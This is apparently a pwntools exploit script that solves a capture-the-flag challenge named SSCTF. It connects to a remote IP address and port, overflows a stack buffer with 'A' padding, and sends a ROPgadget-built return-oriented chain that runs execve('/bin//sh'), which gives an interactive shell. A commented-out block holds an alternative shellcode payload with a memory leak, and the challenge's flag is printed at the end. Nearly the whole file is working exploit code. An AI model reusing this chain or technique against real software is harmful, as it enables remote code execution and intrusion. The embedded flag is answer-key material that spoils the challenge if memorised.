from pwn import *
from struct import pack
import time

#os.environ['LD_PRELOAD'] = './libc32.so'
context.log_level = 'debug'
context.arch = "i386"
exe = './250'
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#s= remote('127.0.0.1',9992,timeout=60)
s= remote('60.191.205.81',2017,timeout=60)
#s = process(exe)
#libc = ELF("./libc32.so")

'''
# leak temp addr  
write_addr = 0x0806D580
temp_addr  = 0x080EC9E0
input_data_addr = 0x08048906
payload1 = p32(temp_addr) + 'A'*(0x3A-4) + 'A'*4 + p32(write_addr) + p32(input_data_addr) + p32(1) + p32(temp_addr) + p32(4)
print str(len(payload1))
print payload1


shellcode_32 = shellcraft.i386.linux.sh()
shellcode_32_pwntools = asm(shellcode_32, arch = 'i386', os = 'linux')
jmpesp=asm("jmp esp", arch = 'i386', os = 'linux')
#print len(jmpesp)

payload = 'A'*(0x3A) + 'A'*4 + p32(temp_addr+66) + shellcode_32_pwntools
print str(len(payload))
print payload

s.recvuntil('SSCTF[InPut Data Size]')

s.sendline(str(len(payload)))

s.recvuntil('SSCTF[YourData]')

s.send(payload)

s.interactive()
'''

# execve generated by ROPgadget

# Padding goes here
p = ''

p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080b89e6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb064) # @ .data + 4
p += pack('<I', 0x080b89e6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080493a3) # xor eax, eax ; ret
p += pack('<I', 0x080549bb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080eb060) # @ .data
p += pack('<I', 0x080df1b9) # pop ecx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x0806efbb) # pop edx ; ret
p += pack('<I', 0x080eb068) # @ .data + 8
p += pack('<I', 0x080493a3) # xor eax, eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0804e7d2) # inc eax ; ret
p += pack('<I', 0x0806cbb5) # int 0x80

payload = 'A'*(0x3A) + 'A'*4 + p
s.recvuntil('SSCTF[InPut Data Size]')

s.sendline(str(len(payload)))

s.recvuntil('SSCTF[YourData]')

s.send(payload)

s.interactive()
# ssctf{47bce5c74f589f4867dbd57e9ca9f808}
# Best command: ROPgadget --binary 250 --ropchain > ropchain_ssctf_pwn2  
